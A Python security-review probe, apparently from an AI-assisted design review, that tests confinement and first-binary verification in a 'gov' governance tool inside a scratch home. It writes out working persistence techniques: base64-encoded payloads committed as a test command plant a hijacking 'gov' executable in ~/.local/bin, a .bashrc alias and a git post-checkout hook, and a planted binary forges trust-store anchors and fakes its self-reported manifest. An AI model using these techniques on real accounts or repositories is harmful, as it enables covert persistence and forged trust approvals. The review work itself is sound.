#!/usr/bin/env python3
"""RV4-B confinement persistence and first-binary self-report — held-out attacks of review r4 reviewer B (AR-0006).
Scratch only; the repository is never written; the account's real home is never written (HOME is redirected into scratch).

Part A (RV4-B-A05, executed on the real legacy 4.1.5 binary as the command runner; design comparison with revision 4):
  A repository writer (A2) commits PROJECT_POLICY.tests.product_test_command. `gov verify product` executes it as the
  invoking account (as review r3 RV3-B-A03 showed). Revision 4 requires such children to run confined, with writes denied
  ONLY to: the system and account pin locations, the Verifier Trust Store, governance/trust/**, the occupation entries and
  the transaction area (24 §3.5 (3); 09 R-CONF-1). The child here writes nothing in that list. It writes:
    (1) an executable named `gov` in $HOME/.local/bin (a directory that the Ubuntu/Debian default ~/.profile prepends to PATH);
    (2) a line in $HOME/.bashrc;
    (3) .git/hooks/post-checkout in the governed repository.
  The probe then shows what runs next, unconfined, as the same account: a login shell's `gov` resolves to the planted file;
  `git checkout` runs the planted hook; the planted code can write a VTS human anchor and a trust-gate confirmation
  (24 §8 locations), which RS-3/TG-2 accept as same-account forgery once code runs unconfined.
  Each written path is classified against the R-CONF-1 deny list.

Part B (RV4-B-A04, executed): 06 §2 step 6 (c) verifies a first binary built from source by comparing `gov version --trust`
  (lineage id and TBM digest) with the channel and the build attestation. `gov version --trust` is printed by the binary
  under verification (R-ART-4), and the TBM (25 §4, schema) carries no digest of the binary's code. A planted `gov` that
  prints the genuine TBM passes that comparison; comparing the binary's SHA-256 with the attestation's artifact digest refuses it.

Environment: REVIEW_REPO, GOV (default legacy 4.1.5), GOV_REVIEW_SCRATCH. GOV_* stripped. Output: JSON on stdout.
"""
import base64, hashlib, json, os, re, stat, subprocess, sys, tempfile

import yaml

sys.dont_write_bytecode = True
REPO = os.environ["REVIEW_REPO"]
PACK = os.path.join(REPO, "release", "root-of-trust", "4.1.6")
GOV = os.environ.get("GOV", "/tmp/claude-1000/-home-usain-Dynamic-Agentic-Engineering-OS/fc4fea1b-ad8d-4050-bd73-d14eea9b9c18/scratchpad/legacy-bin/gov-4.1.5")
REL = os.path.join(REPO, "release", "releases", "4.1.5")
S = tempfile.mkdtemp(prefix="rv4b-conf-", dir=os.environ.get("GOV_REVIEW_SCRATCH") or tempfile.gettempdir())
HOME = S + "/home"
os.makedirs(HOME)
ENV = {k: v for k, v in os.environ.items() if not k.startswith("GOV_")}
ENV["HOME"] = HOME
ENV["GOV_KERNEL_CACHE"] = S + "/cache"
ENV["PATH"] = "/usr/bin:/bin"
out = {"probe": "RV4-B confinement persistence and first-binary self-report (AR-0006)", "binary": subprocess.run([GOV, "--version"], capture_output=True, text=True).stdout.strip(), "scratch": "<scratch>"}
TRUST_ROOT_ID = "sha256:" + "cc" * 32


def gov(root, role, *a, env=None):
    r = subprocess.run([GOV, "--json", "--root", root, "--session", "S-rv4b-conf", "--role", role, *a], env=env or ENV, capture_output=True, text=True)
    try:
        return json.loads(r.stdout)
    except Exception:
        return {"raw": r.stdout[-400:], "stderr": r.stderr[-400:]}


def git(root, *a, who="victim"):
    return subprocess.run(["git", "-c", f"user.name={who}", "-c", f"user.email={who}@x", *a], cwd=root, check=True, capture_output=True, text=True, env=ENV)


# ------------------------------------------------------------------------------------------------ part A
root = S + "/consumer"
os.makedirs(root)
git(root, "init", "-q")
git(root, "commit", "-q", "--allow-empty", "-m", "i")
init = gov(root, "orchestrator", "init", "--source", REL, "--name", "rv4bconf", "--skip-index")
git(root, "add", "-A")
git(root, "commit", "-q", "-m", "installed")

planted_gov = ("#!/bin/sh\n"
               "# planted by a gov-run repository command; runs later, unconfined, as the account\n"
               "d=\"$HOME/.local/state/gov/trust/" + TRUST_ROOT_ID.replace(":", "_") + "\"\n"
               "mkdir -p \"$d/confirmations\"\n"
               "printf '%s\\n' '{\"anchors\":[{\"sequence\":5,\"digest\":\"sha256:" + "44" * 32 + "\",\"method\":\"human\",\"anchored_at\":\"NOW\"}]}' > \"$d/anchors.json\"\n"
               "printf '%s\\n' '{\"gate_kind\":\"framework_update\",\"method\":\"interactive_terminal\"}' > \"$d/confirmations/framework_update-planted.json\"\n"
               "echo PLANTED-GOV-RAN uid=$(id -u) args=\"$*\"\n")
hook = "#!/bin/sh\necho HOOK-RAN uid=$(id -u) > \"$HOME/hook-ran.txt\"\n"
b64 = lambda t: base64.b64encode(t.encode()).decode()
script = ("umask 022; mkdir -p \"$HOME/.local/bin\"; "
          f"echo {b64(planted_gov)} | base64 -d > \"$HOME/.local/bin/gov\"; chmod 755 \"$HOME/.local/bin/gov\"; "
          f"echo {b64(chr(10) + 'alias gov=$HOME/.local/bin/gov' + chr(10))} | base64 -d >> \"$HOME/.bashrc\"; "
          f"echo {b64(hook)} | base64 -d > .git/hooks/post-checkout; chmod 755 .git/hooks/post-checkout; "
          "echo child uid=$(id -u) cwd=$(pwd)")
pp = os.path.join(root, "governance", "project", "PROJECT_POLICY.yaml")
doc = yaml.safe_load(open(pp))
doc.setdefault("tests", {})["product_test_command"] = ["sh", "-c", script]
with open(pp, "w") as fh:
    yaml.safe_dump(doc, fh, sort_keys=False)
git(root, "add", "-A")
git(root, "commit", "-q", "-m", "ci: product tests", who="a2-collaborator")
ver = gov(root, "orchestrator", "verify", "product")
res = ver.get("result") or {}

written = {"$HOME/.local/bin/gov": HOME + "/.local/bin/gov", "$HOME/.bashrc": HOME + "/.bashrc", "<repo>/.git/hooks/post-checkout": root + "/.git/hooks/post-checkout"}
DENY = {  # 24 §3.5 (3) / 09 R-CONF-1, resolved for this account
    "system pin directory": "/etc/gov/",
    "account pin location": HOME + "/.config/gov/",
    "Verifier Trust Store": HOME + "/.local/state/gov/trust/",
    "governance/trust/**": root + "/governance/trust/",
    "occupation entries": None,  # governance/kernel, governance/project, governance/framework.lock, .governance-runtime/migration (26 §2)
    "transaction area": root + "/.governance-runtime/trust-tx/",
}
OCC = [root + "/governance/kernel", root + "/governance/project", root + "/governance/framework.lock", root + "/.governance-runtime/migration"]


def covered(p):
    hits = [name for name, prefix in DENY.items() if prefix and p.startswith(prefix)]
    hits += ["occupation entries"] if any(p == o or p.startswith(o + "/") for o in OCC) else []
    return hits


classification = {}
for label, p in written.items():
    st = os.stat(p) if os.path.exists(p) else None
    classification[label] = {"written_by_gov_run_child": st is not None, "owner_uid": st.st_uid if st else None,
                             "executable": bool(st and st.st_mode & stat.S_IXUSR), "in_R_CONF_1_deny_list": covered(p)}

# What runs next, unconfined, as the account: a login shell with the distribution-default ~/.profile PATH rule.
profile = 'if [ -d "$HOME/.local/bin" ] ; then PATH="$HOME/.local/bin:$PATH"; fi\n'
open(HOME + "/.profile", "w").write(profile)
login = subprocess.run(["bash", "-lc", "command -v gov; gov status"], env=ENV, capture_output=True, text=True, cwd=root)
co = subprocess.run(["git", "checkout", "-q", "-b", "feature-x"], cwd=root, capture_output=True, text=True, env=ENV)
hook_ran = open(HOME + "/hook-ran.txt").read().strip() if os.path.exists(HOME + "/hook-ran.txt") else None
vts = HOME + "/.local/state/gov/trust/" + TRUST_ROOT_ID.replace(":", "_")
out["A_confined_child_persistence"] = {
    "init_ok": init.get("ok"), "verify_product_ok": ver.get("ok"), "child_ran": res.get("ran"), "child_stdout_tail": res.get("stdout_tail"),
    "written_paths": classification,
    "any_written_path_in_deny_list": any(v["in_R_CONF_1_deny_list"] for v in classification.values()),
    "next_login_shell": {"command_v_gov": login.stdout.splitlines()[0] if login.stdout else None, "stdout_tail": login.stdout[-300:], "rc": login.returncode},
    "planted_gov_resolved_before_real_binary": bool(login.stdout) and login.stdout.splitlines()[0] == HOME + "/.local/bin/gov",
    "planted_code_wrote_vts_anchor_and_confirmation": os.path.exists(vts + "/anchors.json") and os.path.exists(vts + "/confirmations/framework_update-planted.json"),
    "git_hook_ran_on_checkout": hook_ran, "git_checkout_rc": co.returncode, "git_checkout_stderr": co.stderr[-200:],
    "design_reference": "24 §3.5 (3), 09 R-CONF-1 (deny list), 24 §10 RS-3 and 27 TG-2 (same-account VTS forgery accepted), 25 TB-1",
}

# ------------------------------------------------------------------------------------------------ part B
tbm_example = json.load(open(os.path.join(PACK, "examples", "rev4", "trust-base-manifest.v2.example.json")))
ba_example = json.load(open(os.path.join(PACK, "examples", "rev4", "build-attestation.v2.payload.example.json")))
tbm_schema = json.load(open(os.path.join(PACK, "schemas", "trust-base-manifest.schema.json")))


def canon(o):
    return json.dumps(o, sort_keys=True, separators=(",", ":")).encode()


genuine_tbm_digest = "sha256:" + hashlib.sha256(canon(tbm_example)).hexdigest()
attested_binary_digest = ba_example["artifact"]["digest"]
fake = S + "/built-from-moved-tag/gov"
os.makedirs(os.path.dirname(fake))
open(fake, "w").write("#!/bin/sh\n# any code at all; built from a commit the source controller chose\n"
                      f"if [ \"$1\" = version ] && [ \"$2\" = --trust ]; then printf '%s\\n' '{json.dumps({'lineage': tbm_example['lineage'], 'tbm': tbm_example, 'tbm_digest': genuine_tbm_digest})}'; fi\n")
os.chmod(fake, 0o755)
reported = json.loads(subprocess.run([fake, "version", "--trust"], capture_output=True, text=True, env=ENV).stdout)
fake_digest = "sha256:" + hashlib.sha256(open(fake, "rb").read()).hexdigest()


def fields(schema_obj, prefix=""):
    names = []
    for k, v in (schema_obj.get("properties") or {}).items():
        names.append(prefix + k)
        if isinstance(v, dict) and v.get("type") == "object":
            names += fields(v, prefix + k + ".")
    return names


tbm_fields = fields(tbm_schema)
out["B_first_binary_path_c"] = {
    "procedure_as_written": "06 §2 step 6 (c): build from source at the final tag, compare `gov version --trust` (lineage id and TBM digest) with the channel and the build attestation",
    "value_source": "printed by the binary under verification (09 R-ART-4)",
    "tbm_schema_fields": tbm_fields,
    "tbm_schema_has_code_or_binary_digest_field": any(re.search(r"(binary_digest|code_digest|text_digest|artifact_digest|sha256_of_binary)", f) for f in tbm_fields),
    "planted_binary_reports_genuine_lineage": reported["lineage"] == tbm_example["lineage"],
    "planted_binary_reports_genuine_tbm_digest": reported["tbm_digest"] == genuine_tbm_digest,
    "procedure_c_as_written_passes": reported["lineage"] == tbm_example["lineage"] and reported["tbm_digest"] == genuine_tbm_digest,
    "binary_sha256_equals_attested_artifact_digest": fake_digest == attested_binary_digest,
    "a_binary_digest_comparison_would_refuse": fake_digest != attested_binary_digest,
    "migration_plan_reference": "11 Phase 4: legacy consumers run `gov trust verify-artifact` for the 4.1.6 binary; no earlier RoT-1 binary exists on those machines, so the verifier is the binary under verification",
}

txt = json.dumps(out, indent=1, default=str)
txt = txt.replace(S, "<scratch>").replace(REPO, "<worktree>").replace(os.path.dirname(GOV), "<legacy-bin>")
txt = re.sub(r"/tmp/claude-1000/[^\"\s]*", "<scratchpad-path>", txt)
print(txt)
